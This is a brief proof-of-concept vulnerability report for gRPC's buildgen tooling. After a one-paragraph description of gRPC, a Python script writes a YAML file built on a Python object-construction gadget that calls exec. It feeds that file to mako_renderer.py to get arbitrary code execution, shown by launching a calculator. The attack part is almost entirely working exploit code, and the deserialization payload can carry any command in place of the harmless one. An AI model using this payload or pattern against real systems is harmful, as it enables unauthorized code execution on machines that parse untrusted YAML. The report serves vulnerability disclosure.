# Description
gRPC is a modern, open source, high-performance remote procedure call (RPC) framework that can run anywhere. gRPC enables client and server applications to communicate transparently, and simplifies the building of connected systems.
# POC
* run the exploit file
```
import os
#os.system("git clone https://github.com/grpc/grpc.git")
payload = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open("exploit.yml","w+").write(payload)
os.chdir("grpc/tools/buildgen/")
cmd = """python3 mako_renderer.py -d ../../../exploit.yml"""
os.system(cmd)
```
* calc will be popped up as a result of arbitrary code execution 
